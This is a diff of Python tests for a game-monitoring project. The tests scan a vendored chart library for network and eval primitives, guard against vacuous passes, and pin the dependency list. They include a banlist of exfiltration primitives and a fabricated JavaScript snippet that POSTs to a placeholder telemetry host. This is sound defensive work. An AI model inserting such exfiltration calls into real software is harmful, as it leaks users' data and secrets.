@@ -280,3 +280,250 @@ def test_a_revisao_registra_a_REFUTACAO_do_zoom_por_roda() -> None:
         "revisao do README diz o contrario, e o plano 01-07 escreve o zoom por "
         "roda a mao por causa dessa ausencia. Reconferir os dois."
     )
+
+
+# ---------------------------------------------------------------------------
+# VEND-3 — o teste que QUEBRA
+# ---------------------------------------------------------------------------
+#
+# A DOUTRINA DA CASA, e por que ela e repetida aqui
+# =================================================
+# A verificacao da Fase 4 contou OITO instancias do mesmo padrao de defeito
+# nesta arvore: um guarda cuja saida nao muda com o fato que ele julga. O
+# antidoto e sempre o mesmo, e esta escrito em
+# `tests/test_mercado_firewall_de_fase.py:449-470`:
+#
+#     ao lado da afirmacao, o CONTROLE NEGATIVO que prova que o guarda reprova
+#     quando o fato acontece.
+#
+# Este modulo e especialmente exposto a esse defeito, por dois caminhos:
+#
+#   1. VACUIDADE. Uma varredura sobre uma pasta `vendor/` vazia — ou sobre um
+#      filtro de extensao que deixou de casar — fica VERDE para sempre. Zero
+#      arquivos examinados produz zero ocorrencias encontradas, que e
+#      exatamente o que o teste quer ver.
+#   2. AUTO-ANULACAO. O `README.md` desta pasta CITA todas as primitivas pelo
+#      nome, porque o VEND-2 manda registrar a contagem por primitiva. Uma
+#      varredura ingenua sobre o diretorio inteiro acusaria o proprio documento
+#      que a regra manda escrever — e o conserto obvio (afrouxar a varredura,
+#      ou tirar as primitivas do README) mataria uma das duas provas.
+#
+# Os tres guardas abaixo fecham os dois caminhos, e o controle negativo prova
+# que o detector acusa sem que nada precise de fato entrar na arvore.
+
+
+def _primitivas_presentes(texto: str) -> set[str]:
+    """O UNICO ponto de decisao do modulo — e por isso o alvo da mutacao.
+
+    Manter a decisao numa funcao pura, que recebe TEXTO e nao um caminho, e o
+    que permite provar que o detector acusa sem baixar nada de verdade e sem
+    escrever um arquivo malicioso na arvore. A mutacao acontece na ENTRADA da
+    funcao, nunca no disco.
+
+    Busca literal, de proposito: ver a nota de limite em `PRIMITIVAS`.
+    """
+    return {primitiva for primitiva in PRIMITIVAS if primitiva in texto}
+
+
+def _mensagem(encontradas: set[str], arquivo: str) -> str:
+    return (
+        f"PRIMITIVA DE REDE NO ARQUIVO VENDORIZADO: "
+        f"{', '.join(sorted(encontradas))} (encontrada em {arquivo}).\n"
+        f"\n"
+        f"Este arquivo e de TERCEIRO e executa no NAVEGADOR DO USUARIO, na "
+        f"mesma maquina em que o jogo roda e na mesma arvore em que mora o "
+        f"`.env` com o token do Chatwoot. Uma biblioteca de grafico recebe um "
+        f"array de numeros e desenha: ela nao precisa de nenhuma dessas "
+        f"primitivas para fazer o trabalho dela.\n"
+        f"\n"
+        f"O VEND-2 diz que qualquer ocorrencia exige REVISAO HUMANA EXPLICITA "
+        f"E REGISTRADA antes de seguir. A CSP do VEND-4 conteria o estrago no "
+        f"navegador, mas o portao e sobre o FONTE, e nao sobre a contencao — e "
+        f"o navegador barra em silencio, sem contar a ninguem daqui.\n"
+        f"\n"
+        f"Se a primitiva chegou junto com uma atualizacao de versao: pare, "
+        f"leia o contexto dela no minificado, e leve a decisao ao usuario com "
+        f"`arquivo:linha`. Registre o resultado em "
+        f"`l2scanner/recursos/dashboard/vendor/README.md`.\n"
+        f"\n"
+        f"Ver a secao `Registry Safety` de {DOCUMENTO_DA_REGRA}."
+    )
+
+
+def test_nenhum_arquivo_vendorizado_TRAZ_primitiva_de_rede() -> None:
+    """A varredura, sobre os arquivos em disco. VEND-3.
+
+    Esta e a afirmacao. Ela sozinha nao vale nada — o que a torna um guarda sao
+    os tres testes abaixo: o controle negativo, o guarda de alcance e o guarda
+    contra vacuidade.
+    """
+    for arquivo in _arquivos_de_codigo_do_vendor():
+        texto = arquivo.read_text(encoding="utf-8", errors="replace")
+        encontradas = _primitivas_presentes(texto)
+        assert not encontradas, _mensagem(
+            encontradas, str(arquivo.relative_to(RAIZ))
+        )
+
+
+def test_o_detector_ACUSA_uma_primitiva_de_rede_injetada() -> None:
+    """O CONTROLE NEGATIVO — a prova do vermelho SEM baixar nada.
+
+    Sem este teste, um bug no filtro de extensao, uma `PRIMITIVAS` esvaziada
+    numa refatoracao, ou simplesmente uma pasta `vendor/` vazia deixariam a
+    varredura acima verde PARA SEMPRE, e o firewall viraria teatro de controle
+    — a nona instancia do padrao de defeito que esta arvore ja nomeou oito
+    vezes.
+
+    O trecho e FABRICADO aqui dentro, na entrada da funcao pura. Nada e escrito
+    no disco: cometer o proprio pecado que o teste existe para impedir seria
+    uma forma cara de se enganar.
+    """
+    fabricado = (
+        "!function(){var d=document.createElement('div');"
+        "fetch('https://telemetria.exemplo/coleta',{method:'POST'});}();"
+    )
+    assert _primitivas_presentes(fabricado) == {"fetch("}
+
+    # E o trecho inocente NAO pode virar falso positivo: um guarda que acusa a
+    # esmo e desligado na primeira semana, e ai nao guarda mais nada.
+    inocente = (
+        "!function(){var u=new uPlot(opts,data,root);"
+        "u.setScale('x',{min:0,max:100});}();"
+    )
+    assert _primitivas_presentes(inocente) == set()
+
+    # As outras formas tambem acusam — a banlist e ampla justamente porque
+    # `fetch(` nao e a unica porta.
+    assert _primitivas_presentes("var t=new XMLHttpRequest();") == {
+        "XMLHttpRequest"
+    }
+    assert _primitivas_presentes("navigator.sendBeacon('/x',d)") == {
+        "navigator.sendBeacon",
+        "sendBeacon",
+    }
+    assert _primitivas_presentes("var f=new Function('a','return a')") == {
+        "new Function",
+        "Function(",
+    }
+    assert _primitivas_presentes("new WebSocket('wss://x')") == {"WebSocket"}
+
+
+def test_a_varredura_NAO_alcanca_o_README_que_CITA_as_primitivas() -> None:
+    """O GUARDA DE ALCANCE — onde este modulo poderia se auto-anular.
+
+    O `README.md` cita todas as primitivas pelo nome, porque o VEND-2 EXIGE a
+    contagem por primitiva registrada por escrito. Se a varredura enxergasse o
+    diretorio inteiro, ela acusaria o proprio documento que a regra manda
+    escrever — e o conserto que qualquer um faria (tirar as primitivas do
+    README, ou afrouxar a varredura) destruiria uma das duas provas.
+
+    A segunda metade e o que torna este teste um guarda e nao uma decoracao:
+    ela prova que o filtro e LOAD-BEARING, mostrando que o README de fato
+    dispararia o detector se estivesse ao alcance dele.
+    """
+    varridos = {arquivo.name for arquivo in _arquivos_de_codigo_do_vendor()}
+
+    assert "uPlot.iife.min.js" in varridos, (
+        "o arquivo de codigo vendorizado saiu do alcance da varredura — o "
+        "filtro de extensao deixou de casar, e o firewall ficou vazio"
+    )
+    assert "README.md" not in varridos
+    assert "uPlot.LICENSE" not in varridos
+    assert ".gitattributes" not in varridos
+
+    # A prova de que o filtro esta segurando alguma coisa de verdade.
+    no_readme = _primitivas_presentes(README.read_text(encoding="utf-8"))
+    assert len(no_readme) >= 5, (
+        "o README deixou de citar as primitivas, e com isso este guarda de "
+        "alcance deixou de guardar qualquer coisa. Ou a nota de revisao do "
+        "VEND-2 sumiu (o que ja e um problema), ou ela virou vaga demais."
+    )
+
+
+def test_a_varredura_enumerou_ao_menos_UM_arquivo() -> None:
+    """O GUARDA CONTRA VACUIDADE — uma pasta vazia tem de FALHAR.
+
+    Zero arquivos examinados produz zero ocorrencias encontradas, que e
+    exatamente o que `test_nenhum_arquivo_vendorizado_TRAZ_primitiva_de_rede`
+    quer ver. Uma pasta `vendor/` apagada, um `.gitignore` engolindo os
+    artefatos, ou um caminho errado em `VENDOR` deixariam a suite verde sobre
+    uma arvore sem firewall nenhum.
+    """
+    arquivos = _arquivos_de_codigo_do_vendor()
+    assert arquivos, (
+        f"{VENDOR.relative_to(RAIZ)} nao tem nenhum arquivo de codigo. A "
+        f"varredura do VEND-3 passaria por VACUIDADE — nao porque a biblioteca "
+        f"esta limpa, mas porque nao ha o que ler."
+    )
+    assert len(arquivos) >= 2, (
+        "uPlot precisa de DOIS arquivos (codigo e folha de estilo); um deles "
+        "sumiu, e a pagina ou o guarda estao incompletos"
+    )
+
+
+# ---------------------------------------------------------------------------
+# NENHUMA DEPENDENCIA NOVA
+# ---------------------------------------------------------------------------
+#
+# As onze distribuicoes que o projeto declarava ANTES desta fase. A lista esta
+# escrita A MAO de proposito, no molde de
+# `tests/test_mercado_firewall_de_fase.py:400-403`: deriva-la do proprio
+# `requirements.txt` faria o teste concordar com qualquer coisa que alguem
+# acrescentasse.
+#
+# A biblioteca de grafico vendorizada NAO entra nesta lista, e a distincao e o
+# ponto: ela e um ATIVO ESTATICO servido ao navegador, e nao uma dependencia do
+# interpretador Python. Nenhum `pip install` a traz, nenhum `import` a alcanca,
+# e o `vigiar-party.bat` nao muda por causa dela. Foi justamente por isso que a
+# escolha da biblioteca pesou BYTES VENDORIZADOS, e nao peso de wheel.
+DISTRIBUICOES_ANTES_DA_FASE_01_DASHBOARD = {
+    "mss",
+    "opencv-python",
+    "numpy",
+    "windows-capture",
+    "winrt-windows-media-ocr",
+    "winrt-windows-graphics-imaging",
+    "winrt-windows-storage-streams",
+    "winrt-windows-globalization",
+    "winrt-windows-foundation",
+    "winrt-windows-foundation-collections",
+    "discord-py",
+}
+
+
+class TestNenhumaDependenciaNova:
+    """O `requirements.txt` nao ganhou linha nesta fase, e ha teste prendendo.
+
+    O extrator de nome de distribuicao e IMPORTADO de `test_firewall_escopo`, e
+    nao reescrito: um segundo extrator com um `_FIM_DO_NOME` ligeiramente
+    diferente seria a forma mais silenciosa de os dois firewalls discordarem
+    sobre o que e um nome de pacote.
+    """
+
+    def test_o_requirements_nao_ganhou_linha_nesta_fase(self) -> None:
+        from tests.test_firewall_escopo import _nomes_declarados_no_requirements
+
+        texto = (RAIZ / "requirements.txt").read_text(encoding="utf-8")
+        assert (
+            _nomes_declarados_no_requirements(texto)
+            == DISTRIBUICOES_ANTES_DA_FASE_01_DASHBOARD
+        )
+
+    def test_o_guarda_REPROVA_quando_uma_linha_NOVA_e_declarada(self) -> None:
+        """O controle negativo do guarda acima.
+
+        A mutacao acontece no TEXTO entregue ao extrator, e nao no
+        `requirements.txt` do disco — acrescentar uma dependencia de verdade
+        dentro de um teste seria cometer o que o teste existe para impedir.
+
+        Sem esta metade, um bug no extrator (ou um recorte de comentario que
+        engolisse linhas demais) faria a igualdade acima passar sobre uma
+        arvore em que a dependencia nova ESTAVA declarada.
+        """
+        from tests.test_firewall_escopo import _nomes_declarados_no_requirements
+
+        texto = (RAIZ / "requirements.txt").read_text(encoding="utf-8")
+        adulterado = texto + "\nplotly>=6.0\n"
+        nomes = _nomes_declarados_no_requirements(adulterado)
+        assert nomes != DISTRIBUICOES_ANTES_DA_FASE_01_DASHBOARD
+        assert "plotly" in nomes
